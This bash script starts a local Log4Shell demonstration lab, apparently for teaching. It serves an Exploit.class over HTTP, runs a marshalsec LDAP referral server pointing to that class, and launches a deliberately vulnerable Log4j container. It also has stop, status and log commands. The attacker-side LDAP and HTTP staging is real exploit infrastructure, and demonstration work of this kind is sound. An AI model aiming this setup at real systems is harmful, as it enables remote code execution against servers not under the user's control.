#!/bin/bash

# Log4Shell Demo - Start All Servers Script
# This script starts HTTP, LDAP, and vulnerable servers in the background

set -e

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Configuration
HTTP_PORT=8888
LDAP_PORT=1389
APP_PORT=8080
HOST_IP=${HOST_IP:-$(hostname -I | awk '{print $1}')}
LOG_DIR="./logs"
PID_FILE="./.server_pids"

# Create logs directory
mkdir -p "$LOG_DIR"

# Function to print colored messages
print_info() {
    echo -e "${BLUE}[INFO]${NC} $1"
}

print_success() {
    echo -e "${GREEN}[SUCCESS]${NC} $1"
}

print_warning() {
    echo -e "${YELLOW}[WARNING]${NC} $1"
}

print_error() {
    echo -e "${RED}[ERROR]${NC} $1"
}

# Function to check if port is in use
check_port() {
    local port=$1
    if lsof -Pi :$port -sTCP:LISTEN -t >/dev/null 2>&1 || ss -ltn | grep -q ":$port " 2>/dev/null; then
        return 0  # Port is in use
    else
        return 1  # Port is free
    fi
}

# Function to wait for port to be ready
wait_for_port() {
    local port=$1
    local max_wait=10
    local count=0

    while [ $count -lt $max_wait ]; do
        if check_port $port; then
            return 0
        fi
        sleep 1
        count=$((count + 1))
    done
    return 1
}

# Function to stop all servers
stop_servers() {
    print_info "Stopping all servers..."

    if [ -f "$PID_FILE" ]; then
        while IFS= read -r pid; do
            if [ -n "$pid" ] && kill -0 "$pid" 2>/dev/null; then
                kill "$pid" 2>/dev/null && print_success "Stopped process $pid"
            fi
        done < "$PID_FILE"
        rm -f "$PID_FILE"
    fi

    # Stop any container that might be running
    podman stop $(podman ps -q --filter ancestor=log4jcve) 2>/dev/null || true

    # Clean up other processes
    pkill -f "python3 -m http.server 8888" 2>/dev/null || true
    pkill -f "marshalsec.jndi.LDAPRefServer" 2>/dev/null || true

    print_success "All servers stopped"
}

# Function to start HTTP server
start_http_server() {
    print_info "Starting HTTP server on port $HTTP_PORT..."

    if check_port $HTTP_PORT; then
        print_warning "Port $HTTP_PORT already in use. Skipping HTTP server."
        return 1
    fi

    if [ ! -d "exploit" ]; then
        print_error "exploit/ directory not found. Run 'make exploit-setup' first."
        return 1
    fi

    cd exploit
    python3 -m http.server $HTTP_PORT > "../$LOG_DIR/http-server.log" 2>&1 &
    local pid=$!
    cd ..

    echo "$pid" >> "$PID_FILE"

    if wait_for_port $HTTP_PORT; then
        print_success "HTTP server started (PID: $pid) - Serving Exploit.class"
        print_info "Logs: $LOG_DIR/http-server.log"
        return 0
    else
        print_error "HTTP server failed to start"
        return 1
    fi
}

# Function to start LDAP server
start_ldap_server() {
    print_info "Starting LDAP server on port $LDAP_PORT..."
    print_info "Host IP: $HOST_IP"

    if check_port $LDAP_PORT; then
        print_warning "Port $LDAP_PORT already in use. Skipping LDAP server."
        return 1
    fi

    if [ ! -f "exploit/marshalsec/target/marshalsec-0.0.3-SNAPSHOT-all.jar" ]; then
        print_error "marshalsec not found. Run 'make exploit-setup' first."
        return 1
    fi

    cd exploit/marshalsec
    java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar \
        marshalsec.jndi.LDAPRefServer "http://$HOST_IP:$HTTP_PORT/#Exploit" $LDAP_PORT \
        > "../../$LOG_DIR/ldap-server.log" 2>&1 &
    local pid=$!
    cd ../..

    echo "$pid" >> "$PID_FILE"

    if wait_for_port $LDAP_PORT; then
        print_success "LDAP server started (PID: $pid) - Redirecting to http://$HOST_IP:$HTTP_PORT/#Exploit"
        print_info "Logs: $LOG_DIR/ldap-server.log"
        return 0
    else
        print_error "LDAP server failed to start"
        return 1
    fi
}

# Function to start vulnerable server
start_vulnerable_server() {
    print_info "Starting vulnerable server on port $APP_PORT..."

    if check_port $APP_PORT; then
        print_warning "Port $APP_PORT already in use. Skipping vulnerable server."
        return 1
    fi

    # Check if image exists
    if ! podman images | grep -q "log4jcve"; then
        print_error "log4jcve image not found. Run 'make build' first."
        return 1
    fi

    podman run --rm --network=host log4jcve \
        > "$LOG_DIR/vulnerable-server.log" 2>&1 &
    local pid=$!

    echo "$pid" >> "$PID_FILE"

    if wait_for_port $APP_PORT; then
        print_success "Vulnerable server started (PID: $pid) - Listening on port $APP_PORT"
        print_info "Logs: $LOG_DIR/vulnerable-server.log"
        return 0
    else
        print_error "Vulnerable server failed to start"
        return 1
    fi
}

# Function to show status
show_status() {
    echo ""
    echo "======================================"
    echo "  Log4Shell Demo - Server Status"
    echo "======================================"
    echo ""

    if check_port $HTTP_PORT; then
        echo -e "${GREEN}✓${NC} HTTP Server:       http://localhost:$HTTP_PORT (Serving Exploit.class)"
    else
        echo -e "${RED}✗${NC} HTTP Server:       Not running"
    fi

    if check_port $LDAP_PORT; then
        echo -e "${GREEN}✓${NC} LDAP Server:       Port $LDAP_PORT (Redirecting to HTTP)"
    else
        echo -e "${RED}✗${NC} LDAP Server:       Not running"
    fi

    if check_port $APP_PORT; then
        echo -e "${GREEN}✓${NC} Vulnerable Server: Port $APP_PORT (Ready to be exploited)"
    else
        echo -e "${RED}✗${NC} Vulnerable Server: Not running"
    fi

    echo ""
    echo "Logs directory: $LOG_DIR/"
    echo ""

    if check_port $HTTP_PORT && check_port $LDAP_PORT && check_port $APP_PORT; then
        echo -e "${GREEN}All servers are running!${NC}"
        echo ""
        echo "To exploit:"
        echo "  make test-exploit"
        echo "  make verify"
        echo ""
        echo "To stop all servers:"
        echo "  $0 stop"
        echo "  (or press Ctrl+C and run: make clean)"
    else
        echo -e "${YELLOW}Some servers failed to start. Check logs in $LOG_DIR/${NC}"
    fi

    echo ""
}

# Main script logic
case "${1:-start}" in
    start)
        echo ""
        echo "╔════════════════════════════════════════════════════════════════╗"
        echo "║          Log4Shell Demo - Starting All Servers                ║"
        echo "╚════════════════════════════════════════════════════════════════╝"
        echo ""

        # Initialize PID file
        > "$PID_FILE"

        # Start servers in order
        start_http_server
        sleep 1

        start_ldap_server
        sleep 1

        start_vulnerable_server
        sleep 2

        # Show status
        show_status
        ;;

    stop)
        stop_servers
        ;;

    status)
        show_status
        ;;

    restart)
        stop_servers
        sleep 2
        $0 start
        ;;

    logs)
        if [ -z "$2" ]; then
            print_info "Available logs:"
            ls -1 "$LOG_DIR/"
            echo ""
            echo "Usage: $0 logs [http|ldap|vulnerable]"
        else
            case "$2" in
                http)
                    tail -f "$LOG_DIR/http-server.log"
                    ;;
                ldap)
                    tail -f "$LOG_DIR/ldap-server.log"
                    ;;
                vulnerable|app)
                    tail -f "$LOG_DIR/vulnerable-server.log"
                    ;;
                *)
                    print_error "Unknown log type. Use: http, ldap, or vulnerable"
                    ;;
            esac
        fi
        ;;

    *)
        echo "Usage: $0 {start|stop|restart|status|logs [http|ldap|vulnerable]}"
        echo ""
        echo "Commands:"
        echo "  start    - Start all servers in background"
        echo "  stop     - Stop all servers"
        echo "  restart  - Restart all servers"
        echo "  status   - Show server status"
        echo "  logs     - View server logs"
        echo ""
        echo "Environment variables:"
        echo "  HOST_IP  - Override auto-detected IP (default: $HOST_IP)"
        echo ""
        exit 1
        ;;
esac
